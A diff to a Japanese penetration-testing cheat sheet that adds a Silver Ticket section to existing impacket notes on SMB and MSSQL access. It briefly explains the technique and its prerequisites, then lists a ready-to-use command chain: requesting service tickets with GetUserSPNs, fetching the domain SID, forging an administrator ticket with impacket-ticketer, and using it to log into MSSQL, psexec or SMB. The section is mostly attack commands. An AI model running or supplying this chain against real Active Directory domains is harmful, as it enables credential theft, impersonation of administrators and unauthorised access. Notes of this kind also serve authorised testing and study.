@@ -40,3 +40,22 @@ impacket-smbclient -k <domain>/<user>:<pass>@<dc name> -dc-ip <IP> #SMBに接続
 #impacketで見つけたユーザ名からリストの作成
 grep -oP '(?<=\\).*(?= \()' input.txt > output.txt
 impacket-mssqlclient -windows-auth <domain>/<user>:<pass>@<IP> #mssqlが動いていたら試す
+
+【シルバーチケット攻撃】
+Silver Ticket は偽造された TGS (Ticket Granting Service) チケットで、DC を経由せずにクライアントとサービス間で直接使用されます。
+代わりに、TGS チケットはサービス アカウント自体によって署名されるため、Silver Ticket はサービス自体の認証のみに制限されます。
+シルバー チケットを作成するには、攻撃者は次のものが必要です。
+１：サービス アカウントのパスワードの NTLM ハッシュ。
+２：ドメインのSID
+３：アカウントに関連付けられたサービス プリンシパル名 (SPN)。
+＃例
+//SPNとパスワードハッシュを入手（ハッシュは解析したあとにNTLMハッシュに変換）
+impacket-GetUserSPNs <domain>/<user>:<pass> -dc-host <dc name> -request -k
+//SIDを入手
+impacket-getPac -targetUser administrator <domain>/<user>:<pass>
+//SPN、NTLMハッシュ、SIDでシルバーチケットを作成
+impacket-ticketer -nthash <NTLM hash> -domain-sid <SID> -domain <domain> -dc-ip <IP> -spn <SPN> administrator　#IPはなくてもよい
+//チケットを環境変数にインポート
+KRB5CCNAME=administrator.ccache 
+//チケットを使ってケルベロスに接続
+impacket-mssqlclient -k -no-pass <dc name>　#mssqlだけでなくpsexecでもsmbclientでも、対象としたSPNで実行できるサービスなら何でもいける
